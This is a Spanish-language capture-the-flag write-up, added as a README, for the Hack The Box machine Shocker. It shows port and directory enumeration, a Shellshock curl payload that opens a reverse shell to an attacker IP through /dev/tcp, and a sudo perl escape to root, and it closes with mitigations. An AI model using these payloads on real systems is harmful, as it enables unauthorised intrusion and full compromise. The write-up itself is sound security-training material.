@@ -1,0 +1,80 @@
+HTB: Shocker - Análisis Técnico de Shellshock (CVE-2014-6271)
+
+Este repositorio contiene la documentación detallada y el proceso de explotación de la máquina Shocker de Hack The Box. 
+El enfoque principal es demostrar el impacto de la vulnerabilidad crítica Shellshock en entornos CGI (Common Gateway Interface).
+
+
+Resumen Ejecutivo:
+
+SO: Linux 
+
+Vulnerabilidad Crítica: Shellshock (CVE-2014-6271).
+
+Vector de Entrada: Scripts CGI mal configurados en Apache.
+
+Escalada de Privilegios: Explotación de permisos Sudo en el binario de Perl.
+
+Resultado: Acceso Root (RCE)
+
+Fase de Reconocimiento
+
+Escaneo de Puertos (Nmap):
+Identificación de servicios abiertos para determinar la superficie de ataque:
+
+nmap -sC -sV -oN nmap/initial 10.10.10.56
+Puerto 80: Apache HTTP Server.
+
+Puerto 2222: OpenSSH (puerto no estándar).
+
+Enumeración Web y Fuzzing:
+
+Al no encontrar contenido relevante en la raíz, se procedió a buscar directorios sensibles como /cgi-bin/ y archivos con extensiones .sh o .cgi.
+
+gobuster dir -u http://10.10.10.56/cgi-bin/ -w /usr/share/wordlists/dirb/common.txt -x sh
+Resultado: Se localizó el script /cgi-bin/user.sh.
+
+Explotación: Shellshock (CVE-2014-6271)
+El Concepto:
+
+La vulnerabilidad reside en cómo Bash procesa las definiciones de funciones en variables de entorno. Al enviar una cadena específica, 
+Bash ejecuta comandos adicionales que se encuentren tras la definición de la función.
+
+El Payload
+Se utilizó Burp Suite o curl para manipular la cabecera User-Agent, inyectando el comando para obtener una Reverse Shell:
+
+curl -H "User-Agent: () { :; }; /bin/bash -i >& /dev/tcp/10.10.14.X/4444 0>&1" http://10.10.10.56/cgi-bin/user.sh
+Desglose del Payload:
+
+() { :; };: Define una función vacía para "engañar" a Bash.
+
+/bin/bash -i: Invoca una shell interactiva.
+
+>& /dev/tcp/...: Redirige la entrada/salida a nuestra máquina de atacante.
+
+Escalada de Privilegios:
+
+Análisis de Sudo
+
+Una vez dentro como el usuario shelly, verificamos los privilegios de sudo:
+
+shelly@shocker:/usr/lib/cgi-bin$ sudo -l
+Matching Defaults entries for shelly on shocker:
+
+env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User shelly may run the following commands on shocker:
+    
+(root) NOPASSWD: /usr/bin/perl
+Explotación de Perl (PrivEsc)
+Dado que perl puede ejecutarse como root sin contraseña, realizamos un "escape" de la shell actual para invocar una con privilegios elevados:
+
+sudo /usr/bin/perl -e 'exec "/bin/bash";'
+Resultado: root@shocker# — Compromiso Total del Sistema.
+
+itigación y Recomendaciones:
+
+Actualización de Bash: Instalar los parches de seguridad posteriores a 2014 que corrigen la interpretación de variables de entorno.
+
+Principio de Menor Privilegio: Restringir el uso de sudo en binarios como Perl, Python o editores de texto que permitan la ejecución de subprocesos (revisar GTFOBins).
+
+Desactivar CGI-BIN: Si no es estrictamente necesario, evitar el uso de scripts CGI heredados.
